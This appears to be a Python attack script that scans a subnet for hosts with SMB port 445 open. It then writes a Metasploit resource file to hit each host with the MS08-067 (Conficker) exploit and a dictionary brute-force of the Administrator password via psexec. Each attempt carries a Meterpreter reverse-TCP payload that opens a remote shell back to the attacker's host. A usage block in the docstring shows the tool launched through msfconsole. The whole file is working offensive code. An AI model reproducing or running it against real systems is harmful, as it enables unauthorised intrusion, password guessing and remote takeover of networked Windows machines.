#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
usage
:
import smbbrute
import os
configFile = open('meta.rc', 'w')

lhost = '192.168.1.12'
lport = '445'
passwdFile = 'dictionary.txt'
tgtHosts = '192.168.1.12-15'
tgtHosts = smbbrute.findTgts(tgtHosts)
smbbrute.setupHandler(configFile, lhost, lport)

for tgtHost in tgtHosts:
    smbbrute.confickerExploit(configFile, tgtHost, lhost, lport)
    if passwdFile != None:
        smbbrute.smbBrute(configFile,tgtHost,passwdFile,lhost,lport)
configFile.close()
os.system('msfconsole -r meta.rc')

'''

import os
import optparse
import sys
import nmap

def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print '[+] Found Target Host: ' + host
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload '+\
      'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def confickerExploit(configFile,tgtHost,lhost,lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload '+\
      'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload '+\
          'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')




